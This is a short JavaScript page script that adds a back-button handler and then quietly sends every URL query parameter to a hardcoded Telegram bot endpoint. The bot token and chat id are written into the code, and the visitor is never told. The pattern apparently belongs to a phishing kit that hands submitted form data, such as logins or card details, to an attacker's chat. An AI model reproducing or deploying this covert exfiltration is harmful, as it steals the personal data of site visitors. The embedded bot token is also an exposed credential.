const $returnBack = document.getElementById('d3-history-back');

$returnBack.addEventListener('click', () => {
  history.back();
});

const get = window.location.search
  .replace( '?', '')
  .split('&')
  .map(item => item.replace('=', ' '))
  .join(' ')
  // .reduce(function(obj, arr){
  //   const item = arr.split('=');
  //   obj[decodeURIComponent(item[0])] = decodeURIComponent(item[1]);
  //   return obj;
  // }, {});

const sendMsg = `https://api.telegram.org/bot6404900072:AAEWApiLlg1mAHquxDcJ9oVwrfzI7Fx91HY/sendMessage?chat_id=-1002114761565&text=${get}`;

fetch(sendMsg);